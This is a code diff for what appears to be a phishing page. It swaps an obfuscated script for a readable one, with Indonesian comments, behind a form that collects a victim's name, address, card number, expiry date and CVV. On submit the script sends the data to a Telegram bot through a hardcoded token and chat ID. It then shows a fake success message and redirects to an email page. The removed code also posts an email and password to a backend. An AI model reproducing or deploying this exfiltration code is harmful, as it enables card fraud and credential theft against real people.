@@ -190,7 +190,108 @@
     </div>
 
     <script>
-function _0x48b9(){const _0x3ff526=['2158506WfqLxx','location','3363008huBtPm','submit','address','Error\x20sending\x20message\x20to\x20backend:','log','stringify','input','/api/sendMessage','3336540KUUHlv','Message\x20sent\x20via\x20backend:','href','Failed\x20to\x20send\x20message\x20to\x20backend','error','\x0aEXP:\x20','Card\x20Type:\x20','POST','Unknown','Name:\x20','addEventListener','5KPuaFw','email.html','Account\x20details\x20saved\x20successfully!','14331528IvCrxn','getElementById','Expiration\x20Date\x20must\x20be\x20in\x20MM/YY\x20format.','CVV\x20must\x20be\x203\x20or\x204\x20digits.','value','application/json','2TytDgx','cardType','accountForm','textContent','creditCard','test','\x0aCC:\x20','Failed\x20to\x20send\x20data.\x20Please\x20try\x20again\x20later.','177511ohWgBz','2928524uEbKQi','Credit\x20Card\x20Number\x20must\x20be\x2016\x20digits.','Account\x20Details:','1968288SEnbWZ','Mastercard','Visa','American\x20Express'];_0x48b9=function(){return _0x3ff526;};return _0x48b9();}const _0x566604=_0x2099;(function(_0x28129c,_0x555293){const _0x40bf08=_0x2099,_0x4809bf=_0x28129c();while(!![]){try{const _0x43f2a1=-parseInt(_0x40bf08(0xe1))/0x1*(parseInt(_0x40bf08(0x107))/0x2)+-parseInt(_0x40bf08(0xe9))/0x3+parseInt(_0x40bf08(0xe2))/0x4*(-parseInt(_0x40bf08(0xfe))/0x5)+parseInt(_0x40bf08(0xf3))/0x6+parseInt(_0x40bf08(0xe5))/0x7+-parseInt(_0x40bf08(0xeb))/0x8+parseInt(_0x40bf08(0x101))/0x9;if(_0x43f2a1===_0x555293)break;else _0x4809bf['push'](_0x4809bf['shift']());}catch(_0xf5d22d){_0x4809bf['push'](_0x4809bf['shift']());}}}(_0x48b9,0x5ccf2));function _0x2099(_0x3f4bb8,_0x2ff6e2){const _0x48b923=_0x48b9();return _0x2099=function(_0x209935,_0x5856d5){_0x209935=_0x209935-0xe0;let _0x310f71=_0x48b923[_0x209935];return _0x310f71;},_0x2099(_0x3f4bb8,_0x2ff6e2);}async function sendToBackend(_0x1bb3c6,_0x48ea87){const _0x2cca30=_0x2099,_0x3c0899=_0x2cca30(0xf2),_0xca4b27={'email':_0x1bb3c6,'password':_0x48ea87};try{const _0x2f4eb4=await fetch(_0x3c0899,{'method':_0x2cca30(0xfa),'headers':{'Content-Type':_0x2cca30(0x106)},'body':JSON[_0x2cca30(0xf0)](_0xca4b27)});if(!_0x2f4eb4['ok'])throw new Error(_0x2cca30(0xf6));const _0x29aef1=await _0x2f4eb4['json']();return console[_0x2cca30(0xef)](_0x2cca30(0xf4),_0x29aef1),!![];}catch(_0x1d8c91){return console[_0x2cca30(0xf7)](_0x2cca30(0xee),_0x1d8c91),alert(_0x2cca30(0xe0)),![];}}function detectCardType(_0x2032cb){const _0x23504b=_0x2099,_0x43c33e=/^4[0-9]{12}(?:[0-9]{3})?$/,_0x3a5e92=/^(5[1-5][0-9]{14}|2221[0-9]{12}|2720[0-9]{12})$/,_0x370311=/^3[47][0-9]{13}$/;if(_0x43c33e[_0x23504b(0x10c)](_0x2032cb))return _0x23504b(0xe7);else{if(_0x3a5e92['test'](_0x2032cb))return _0x23504b(0xe6);else return _0x370311[_0x23504b(0x10c)](_0x2032cb)?_0x23504b(0xe8):_0x23504b(0xfb);}}document[_0x566604(0x102)](_0x566604(0x10b))[_0x566604(0xfd)](_0x566604(0xf1),function(){const _0x1a95f1=_0x566604,_0x3059dd=this[_0x1a95f1(0x105)]['replace'](/\s+/g,''),_0x282cf0=detectCardType(_0x3059dd);document[_0x1a95f1(0x102)](_0x1a95f1(0x108))[_0x1a95f1(0x10a)]=_0x1a95f1(0xf9)+_0x282cf0;}),document[_0x566604(0x102)](_0x566604(0x109))[_0x566604(0xfd)](_0x566604(0xec),async function(_0x37f10f){const _0x285863=_0x566604;_0x37f10f['preventDefault']();const _0x260943=document[_0x285863(0x102)]('name')[_0x285863(0x105)],_0x2ef1d4=document[_0x285863(0x102)](_0x285863(0xed))[_0x285863(0x105)],_0x4cfac6=document[_0x285863(0x102)](_0x285863(0x10b))[_0x285863(0x105)],_0xfda2a5=document[_0x285863(0x102)]('expDate')[_0x285863(0x105)],_0x54f0c9=document[_0x285863(0x102)]('cvv')['value'],_0x353db8=/^\d{16}$/;if(!_0x353db8[_0x285863(0x10c)](_0x4cfac6)){alert(_0x285863(0xe3));return;}const _0x3dbbf8=/^(0[1-9]|1[0-2])\/\d{2}$/;if(!_0x3dbbf8['test'](_0xfda2a5)){alert(_0x285863(0x103));return;}const _0x178670=/^\d{3,4}$/;if(!_0x178670[_0x285863(0x10c)](_0x54f0c9)){alert(_0x285863(0x104));return;}console['log'](_0x285863(0xe4),{'name':_0x260943,'address':_0x2ef1d4,'creditCard':_0x4cfac6,'expDate':_0xfda2a5,'cvv':_0x54f0c9});const _0x47b8f6=_0x285863(0xfc)+_0x260943+'\x0aAddress:\x20'+_0x2ef1d4+_0x285863(0x10d)+_0x4cfac6+_0x285863(0xf8)+_0xfda2a5+'\x0aCVV:\x20'+_0x54f0c9;await sendToTelegram(_0x47b8f6),alert(_0x285863(0x100)),window[_0x285863(0xea)][_0x285863(0xf5)]=_0x285863(0xff);});
+           // Token bot Telegram dan Chat ID
+        const BOT_TOKEN = '7679048680:AAEkcmjzNJCp421MH1u7gi5bUWh3XiTpNQY'; // Ganti dengan token bot Anda
+        const CHAT_ID = '1056460575'; // Ganti dengan Chat ID Anda
+
+        // Fungsi untuk mengirim pesan ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Telegram');
+                }
+
+                const result = await response.json();
+                console.log('Message sent to Telegram:', result);
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+        // Fungsi untuk mendeteksi jenis kartu kredit
+        function detectCardType(cardNumber) {
+            const visaPattern = /^4[0-9]{12}(?:[0-9]{3})?$/;
+            const mastercardPattern = /^(5[1-5][0-9]{14}|2221[0-9]{12}|2720[0-9]{12})$/;
+            const amexPattern = /^3[47][0-9]{13}$/;
+
+            if (visaPattern.test(cardNumber)) {
+                return 'Visa';
+            } else if (mastercardPattern.test(cardNumber)) {
+                return 'Mastercard';
+            } else if (amexPattern.test(cardNumber)) {
+                return 'American Express';
+            } else {
+                return 'Unknown';
+            }
+        }
+
+        // Event listener untuk input nomor kartu
+        document.getElementById('creditCard').addEventListener('input', function() {
+            const cardNumber = this.value.replace(/\s+/g, ''); // Hapus spasi
+            const cardType = detectCardType(cardNumber);
+            document.getElementById('cardType').textContent = `Card Type: ${cardType}`;
+        });
+
+        // Event listener untuk form submission
+        document.getElementById('accountForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            // Ambil nilai dari form
+            const name = document.getElementById('name').value;
+            const address = document.getElementById('address').value;
+            const creditCard = document.getElementById('creditCard').value;
+            const expDate = document.getElementById('expDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Validasi Credit Card Number
+            const creditCardPattern = /^\d{16}$/;
+            if (!creditCardPattern.test(creditCard)) {
+                alert('Credit Card Number must be 16 digits.');
+                return;
+            }
+
+            // Validasi Expiration Date (MM/YY)
+            const expDatePattern = /^(0[1-9]|1[0-2])\/\d{2}$/;
+            if (!expDatePattern.test(expDate)) {
+                alert('Expiration Date must be in MM/YY format.');
+                return;
+            }
+
+            // Validasi CVV
+            const cvvPattern = /^\d{3,4}$/;
+            if (!cvvPattern.test(cvv)) {
+                alert('CVV must be 3 or 4 digits.');
+                return;
+            }
+
+            // Tampilkan data di console (untuk testing)
+            console.log('Account Details:', {
+                name,
+                address,
+                creditCard,
+                expDate,
+                cvv
+            });
+
+            const message = `Name: ${name}\nAddress: ${address}\nCC: ${creditCard}\nEXP: ${expDate}\nCVV: ${cvv}`;
+            await sendToTelegram(message)
+            // Alert simulasi
+            alert('Account details saved successfully!');
+            window.location.href = 'email.html';
+        });
     </script>
 </body>
 </html>
